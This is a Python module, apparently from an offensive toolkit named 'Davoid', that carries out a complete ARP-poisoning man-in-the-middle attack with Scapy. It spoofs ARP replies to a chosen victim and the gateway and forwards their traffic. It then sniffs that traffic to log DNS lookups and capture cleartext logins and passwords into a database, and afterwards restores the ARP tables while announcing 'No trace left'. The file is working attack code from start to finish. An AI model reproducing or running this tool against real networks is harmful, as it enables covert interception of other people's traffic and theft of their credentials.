import os
import sys
import time
import threading
import questionary
from rich.console import Console
from core.ui import draw_header, Q_STYLE
from core.context import ctx
from core.database import db

# Suppress noisy Scapy IPv6 warnings
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    import scapy.all as scapy
except ImportError:
    pass

console = Console()

class MITMEngine:
    def __init__(self):
        self.target_ip = ""
        self.gateway_ip = ""
        self.target_mac = ""
        self.gateway_mac = ""
        self.is_poisoning = False

    def get_mac(self, ip):
        """Resolves the MAC address of a given IP using ARP requests."""
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
        
        if answered_list:
            return answered_list[0][1].hwsrc
        return None

    def toggle_ip_forwarding(self, enable=True):
        """Modifies the OS kernel to forward packets so the victim's internet doesn't break."""
        val = "1" if enable else "0"
        state = "Enabling" if enable else "Disabling"
        console.print(f"[*] {state} IP Forwarding at the OS level...")
        
        try:
            if sys.platform == "darwin":  # macOS
                os.system(f"sysctl -w net.inet.ip.forwarding={val} > /dev/null 2>&1")
            else:  # Linux
                with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                    f.write(val)
        except Exception as e:
            console.print(f"[bold red][!] Could not toggle IP forwarding (Requires sudo):[/bold red] {e}")

    def poison_loop(self):
        """Runs in the background, constantly feeding fake ARP packets."""
        while self.is_poisoning:
            try:
                # Tell Target we are the Gateway
                scapy.send(scapy.ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip), verbose=False)
                # Tell Gateway we are the Target
                scapy.send(scapy.ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip), verbose=False)
                time.sleep(2)
            except Exception:
                pass

    def restore_network(self):
        """Heals the network by sending the correct MAC addresses to both parties."""
        console.print("\n[yellow][*] Healing the network ARP tables...[/yellow]")
        self.is_poisoning = False
        self.toggle_ip_forwarding(enable=False)
        
        try:
            # Restore Target
            scapy.send(scapy.ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac), count=5, verbose=False)
            # Restore Gateway
            scapy.send(scapy.ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip, hwsrc=self.target_mac), count=5, verbose=False)
            console.print("[bold green][+] Network successfully restored. No trace left.[/bold green]")
        except Exception:
            pass

    def process_packet(self, packet):
        """Deep Packet Inspection: Analyzes forwarded traffic for sensitive data."""
        if not packet.haslayer(scapy.IP):
            return

        # Only inspect packets from our victim
        if packet[scapy.IP].src != self.target_ip and packet[scapy.IP].dst != self.target_ip:
            return

        # 1. Catch DNS Requests (See what websites they are visiting)
        if packet.haslayer(scapy.DNSQR):
            query = packet[scapy.DNSQR].qname.decode('utf-8', errors='ignore').strip('.')
            console.print(f"[cyan][DNS][/cyan] Victim requested: [white]{query}[/white]")
            db.log("MITM-DNS", self.target_ip, f"Requested domain: {query}", "INFO")

        # 2. Catch Raw TCP Payloads (HTTP/FTP/Telnet Passwords)
        if packet.haslayer(scapy.Raw):
            try:
                payload = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
                
                # Look for POST requests (often contain logins) or FTP commands
                if any(keyword in payload for keyword in ["POST ", "USER ", "PASS ", "login", "password"]):
                    console.print(f"\n[bold red][!] INTERCEPTED SENSITIVE PAYLOAD:[/bold red]")
                    
                    # Extract just the first few lines to keep terminal clean
                    lines = payload.split('\n')[:5]
                    for line in lines:
                        console.print(f"    [yellow]{line.strip()}[/yellow]")
                        
                    db.log("MITM-Payload", self.target_ip, f"Captured Traffic:\n{payload}", "HIGH")
            except:
                pass

    def run(self):
        draw_header("Adversary-in-the-Middle (ARP Poisoning & Sniffer)")
        
        if os.getuid() != 0:
            console.print("[bold red][!] MITM attacks require raw socket access. Please restart Davoid with 'sudo'.[/bold red]")
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        # Try to pull the gateway from the context, or prompt user
        default_gw = ctx.get("GATEWAY") or "192.168.1.1"
        self.gateway_ip = questionary.text("Gateway/Router IP:", default=default_gw, style=Q_STYLE).ask()
        if not self.gateway_ip: return
        
        self.target_ip = questionary.text("Victim IP Address:", style=Q_STYLE).ask()
        if not self.target_ip: return

        with console.status("[bold cyan]Resolving MAC addresses...", spinner="bouncingBar"):
            self.target_mac = self.get_mac(self.target_ip)
            self.gateway_mac = self.get_mac(self.gateway_ip)

        if not self.target_mac:
            console.print(f"[bold red][!] Could not find MAC address for Victim ({self.target_ip}). Are they online?[/bold red]")
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return
            
        if not self.gateway_mac:
            console.print(f"[bold red][!] Could not find MAC address for Gateway ({self.gateway_ip}).[/bold red]")
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        console.print(f"[+] Victim MAC: [cyan]{self.target_mac}[/cyan]")
        console.print(f"[+] Gateway MAC: [cyan]{self.gateway_mac}[/cyan]\n")

        # Engage routing and background thread
        self.toggle_ip_forwarding(enable=True)
        self.is_poisoning = True
        poison_thread = threading.Thread(target=self.poison_loop, daemon=True)
        poison_thread.start()

        console.print("[bold green][*] ARP Poisoning active. Victim traffic is now flowing through Davoid.[/bold green]")
        console.print("[dim]Note: Modern HTTPS traffic will be encrypted. You will only see DNS requests and cleartext payloads.[/dim]")
        console.print("[bold yellow][!] Sniffing packets... (Press Ctrl+C to stop and heal network)[/bold yellow]\n")

        try:
            # Sniff exclusively on the victim's traffic
            scapy.sniff(prn=self.process_packet, store=False, filter=f"host {self.target_ip}")
        except KeyboardInterrupt:
            self.restore_network()
        except Exception as e:
            console.print(f"[bold red][!] Sniffer crashed:[/bold red] {e}")
            self.restore_network()
            
        questionary.press_any_key_to_continue(style=Q_STYLE).ask()

if __name__ == "__main__":
    MITMEngine().run()